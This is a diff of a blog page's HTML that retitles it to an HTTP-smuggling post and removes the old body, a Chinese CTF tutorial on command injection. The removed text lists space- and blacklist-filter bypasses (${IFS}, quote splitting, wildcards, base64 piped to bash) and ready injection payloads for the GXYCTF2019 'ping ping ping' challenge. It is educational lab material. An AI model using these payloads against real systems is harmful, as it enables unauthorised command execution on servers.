@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="初识ping, Keep-Boom">
+    <meta name="keywords" content="浅析http走私, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>初识ping | Keep-Boom</title>
+    <title>浅析http走私 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">初识ping</h1>
+                    <h1 class="description center-align post-title">浅析http走私</h1>
                 </div>
             </div>
         </div>
@@ -459,86 +459,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="windows和linux管道符"><a href="#windows和linux管道符" class="headerlink" title="windows和linux管道符"></a>windows和linux管道符</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>|直接执行后面的语句</p>
-<p><img src="/images/47.png"></p>
-<p>||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p>
-<p><img src="/images/48.png"></p>
-<p>&amp;前面和后面命令都要执行，无论前面真假</p>
-<p><img src="/images/49.png"></p>
-<p>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-<p><img src="/images/50.png"></p>
-<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><p><code>|、||、&amp;、&amp;&amp;</code>这四种管道符都存在且用法和<code>Windows</code>系统下一样，多了一个<code>;</code>管道符，作用和<code>&amp;</code>一样</p>
-<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><pre><code>[root@VM-0-13-centos var]# cat flag
-this is flag</code></pre>
-<h4 id="lt-gt"><a href="#lt-gt" class="headerlink" title="&lt;&gt;"></a>&lt;&gt;</h4><p>payload</p>
-<pre><code>[root@VM-0-13-centos var]# cat&lt;&gt;flag
-this is flag
-
-[root@VM-0-13-centos var]# cat&lt;flag
-this is flag</code></pre>
-<h4 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h4><p>payload</p>
-<pre><code>[root@VM-0-13-centos var]# cat$&#123;IFS&#125;flag
-this is flag</code></pre>
-<h4 id="IFS-1"><a href="#IFS-1" class="headerlink" title="$IFS$1"></a>$IFS$1</h4><pre><code>[root@VM-0-13-centos var]# cat$IFS$1flag
-this is flag</code></pre>
-<h4 id="09-需php环境"><a href="#09-需php环境" class="headerlink" title="%09(需php环境)"></a>%09(需php环境)</h4><p><img src="/images/51.png"></p>
-<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><pre><code>[root@VM-0-13-centos var]# a=c;b=at;c=fl;d=ag;$a$b $c$d
-this is flag</code></pre>
-<h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><pre><code>[root@VM-0-13-centos var]# echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash
-this is flag</code></pre>
-<h4 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h4><pre><code>[root@VM-0-13-centos var]# ca&#39;&#39;t f&quot;&quot;lag
-this is flag</code></pre>
-<h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><pre><code>[root@VM-0-13-centos var]# ca\t flag
-this is flag</code></pre>
-<h4 id="1、-2、"><a href="#1、-2、" class="headerlink" title="$1、$2、$@"></a>$1、$2、$@</h4><pre><code>[root@VM-0-13-centos var]# c$1at flag
-this is flag
-[root@VM-0-13-centos var]# c$2at flag
-this is flag
-[root@VM-0-13-centos var]# cat f$@lag
-this is flag</code></pre>
-<h4 id="其他命令代替（一般题目不会全过滤干净）"><a href="#其他命令代替（一般题目不会全过滤干净）" class="headerlink" title="其他命令代替（一般题目不会全过滤干净）"></a>其他命令代替（一般题目不会全过滤干净）</h4><pre><code>(1)more:一页一页的显示档案内容
-(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
-(3)head:查看头几行
-(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
-(5)tail:查看尾几行
-(6)nl：显示的时候，顺便输出行号
-(7)od:以二进制的方式读取档案内容
-(8)vi:一种编辑器，这个也可以查看
-(9)vim:一种编辑器，这个也可以查看
-(10)sort:可以查看
-(11)uniq:可以查看
-(12)file -f:报错出具体内容
-(13)pr</code></pre>
-<h4 id="通配符绕过（有点不好理解，自己可以在本地实验下）"><a href="#通配符绕过（有点不好理解，自己可以在本地实验下）" class="headerlink" title="通配符绕过（有点不好理解，自己可以在本地实验下）"></a>通配符绕过（有点不好理解，自己可以在本地实验下）</h4><pre><code>root@kali:~# /???/?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;
-this is your flag
-
-root@kali:~# /???/?at flag
-this is your flag
-
-root@kali:~# /???/?at ????
-this is your flag
-
-root@kali:~# /???/?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;
-this is your flag</code></pre>
-<h4 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h4><p>反引号`和$(命令)</p>
-<pre><code>[root@VM-0-13-centos var]# echo `cat flag`
-this is flag
-
-[root@VM-0-13-centos var]# echo &quot;$(cat flag)&quot;
-this is flag</code></pre>
-<h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><pre><code>&gt;创建文件（会把原来的内容覆盖）
-&gt;&gt;（不会覆盖，会接在下一行）</code></pre>
-<p>#相关方法可以看看我的文章-nepctf总结（不是很全勿喷）</p>
-<p>题目练习(NepCTF-little_trick)</p>
-<h3 id="题目-GXYCTF2019-ping-ping-ping"><a href="#题目-GXYCTF2019-ping-ping-ping" class="headerlink" title="题目[GXYCTF2019]ping ping ping"></a>题目[GXYCTF2019]ping ping ping</h3><p>题目比较简单，直接上payload</p>
-<p>#拼接</p>
-<pre><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre>
-<p>#内敛执行</p>
-<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`</code></pre>
-<p>#编码</p>
-<pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_5">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_5</a></p>
-
+                
             </div>
             <hr/>
 
@@ -563,7 +484,7 @@ this is flag</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/03/25/%E5%88%9D%E8%AF%86ping/">http://example.com/2021/03/25/%E5%88%9D%E8%AF%86ping/</a>
+                    <a href="http://example.com/2021/03/25/%E6%B5%85%E6%9E%90http%E8%B5%B0%E7%A7%81/">http://example.com/2021/03/25/%E6%B5%85%E6%9E%90http%E8%B5%B0%E7%A7%81/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -768,18 +689,17 @@ this is flag</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/03/25/%E5%88%9D%E8%AF%86ping/">
+                <a href="/2021/03/25/Ping%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="初识ping">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Ping的绕过技巧">
                         
-                        <span class="card-title">初识ping</span>
+                        <span class="card-title">Ping的绕过技巧</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -789,9 +709,9 @@ this is flag</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-25
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-25
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -800,7 +720,6 @@ this is flag</code></pre>
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
